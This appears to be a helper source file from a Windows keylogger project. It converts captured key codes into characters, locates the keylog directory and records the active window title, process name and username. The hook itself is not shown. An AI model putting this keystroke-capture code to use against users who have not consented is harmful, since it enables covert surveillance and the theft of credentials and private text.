#include "helpers.hpp"

#include <algorithm>
#include <format>
#include <string>

#include <Psapi.h> 
#include <WtsApi32.h> 

/* ═════════════════════════════════════════════════════════════════════
   String Manipulation Functions
═════════════════════════════════════════════════════════════════════ */

// std::filesystem::path's operator/ triggers a warning in MSVC, this function is a workaround
std::filesystem::path JoinPath(std::filesystem::path dir, std::filesystem::path file)
{
    if (dir.empty() || file.empty()) {
        LogErr("JoinPath called with empty path components: dir='{}', file='{}'", dir, file);
        return {};
    }
    return dir.wstring() + L"\\" + file.wstring();
}

std::string ToLower(std::string str)
{
    std::ranges::transform(str, str.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return str;
}

std::string ToUtf8(const WCHAR* wstr)
{
    if (!wstr) return {};

    const auto wcharCount = wcslen(wstr);
    if (wcharCount == 0) return {};

    const auto byteCount = WideCharToMultiByte(CP_UTF8, 0, wstr, static_cast<int>(wcharCount), nullptr, 0, nullptr, nullptr);
    if (byteCount <= 0) return {};

    std::vector<CHAR> buf(static_cast<size_t>(byteCount));
    if (WideCharToMultiByte(CP_UTF8, 0, wstr, static_cast<int>(wcharCount), buf.data(), byteCount, nullptr, nullptr) != byteCount) {
        return {};
    }

    return {buf.data(), buf.size()};
}

std::wstring ToUtf16(const CHAR* str)
{
    if (!str) return {};

    const auto charCount = strlen(str);
    if (charCount == 0) return {};

    const auto byteCount = MultiByteToWideChar(CP_UTF8, 0, str, static_cast<int>(charCount), nullptr, 0);
    if (byteCount <= 0) return {};

    std::vector<WCHAR> buf(static_cast<size_t>(byteCount));
    if (MultiByteToWideChar(CP_UTF8, 0, str, static_cast<int>(charCount), buf.data(), byteCount) != byteCount) {
        return {};
    }

    return {buf.data(), buf.size()};
}

std::string TranslateKeyToUtf8(DWORD vkCode, DWORD scanCode)
{
    BYTE keyboardState[256] = {};
    if (!GetKeyboardState(keyboardState)) return {};

    if (GetKeyState(VK_CAPITAL) & 1) keyboardState[VK_CAPITAL] |= 1;
    if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] |= 0x80;

    HWND  hwnd = GetForegroundWindow();
    DWORD tid  = hwnd ? GetWindowThreadProcessId(hwnd, nullptr) : 0;
    HKL   hkl  = GetKeyboardLayout(tid ? tid : 0);

    WCHAR     keyUtf16[8] = {};
    const int bytes       = ToUnicodeEx(vkCode, scanCode, keyboardState, keyUtf16, 7, 0, hkl);

    if (bytes <= 0) return {};

    return ToUtf8(keyUtf16);
}

/* ═════════════════════════════════════════════════════════════════════
   Helper Functions
═════════════════════════════════════════════════════════════════════ */

std::filesystem::path GetExeDir()
{
    WCHAR buf[MAX_PATH]{};
    if (const DWORD length = GetModuleFileNameW(nullptr, buf, MAX_PATH); length == 0 || length == MAX_PATH) {
        LogErr("GetModuleFileNameW failed: {}", GetLastError());
        return {};
    }
    return std::filesystem::path(buf).parent_path();
}

std::filesystem::path GetLogDir()
{
    auto logDir = gConfig.KeylogPath;
    if (logDir.empty()) {
        logDir = GetExeDir();
    } else if (!std::filesystem::is_directory(logDir)) {
        logDir = std::filesystem::path(logDir).parent_path();
    }
    return logDir;
}

std::string GetActiveWindowTitle()
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "Unknown Window";

    auto windowTextLength = GetWindowTextLengthW(hwnd);
    if (!windowTextLength) return "Unknown Window";

    std::vector<WCHAR> windowTitle(static_cast<size_t>(windowTextLength) + 1);
    GetWindowTextW(hwnd, windowTitle.data(), windowTextLength + 1);
    return ToUtf8(windowTitle.data());
}

std::string GetActiveProcessName()
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "Unknown Process";

    DWORD processId = 0;
    GetWindowThreadProcessId(hwnd, &processId);
    if (!processId) return "Unknown Process";

    Handle hProcess(OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId));
    if (!hProcess) {
        PrintLastError<0>("OpenProcess");
        return "Unknown Process";
    }

    std::vector<WCHAR> processName(MAX_PATH);
    DWORD              res = GetModuleFileNameExW(hProcess.get(), nullptr, processName.data(), MAX_PATH);
    if (!res) {
        PrintLastError<0>("GetModuleFileNameExW");
        return "Unknown Process";
    }

    auto filename = std::filesystem::path(processName.data()).filename();
    return ToUtf8(filename.c_str());
}

std::string GetActiveUsername()
{
    using WtsGuard = RAII<LPTSTR, &WTSFreeMemory>;

    DWORD  sessionId = WTSGetActiveConsoleSessionId();
    LPTSTR pName     = nullptr;
    DWORD  bytes     = 0;

    if (!WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, &pName, &bytes)) {
        LogErr("WTSQuerySessionInformation failed: {}", GetLastError());
        return {};
    }
    WtsGuard wtsGuard(pName);

    if (pName == nullptr || bytes <= sizeof(TCHAR)) {
        LogErr("Bad WTSQuerySessionInformation result: bytes={}, pName={}", bytes, pName);
        return {};
    }

    std::string name{pName, bytes - 1};
    return name;
}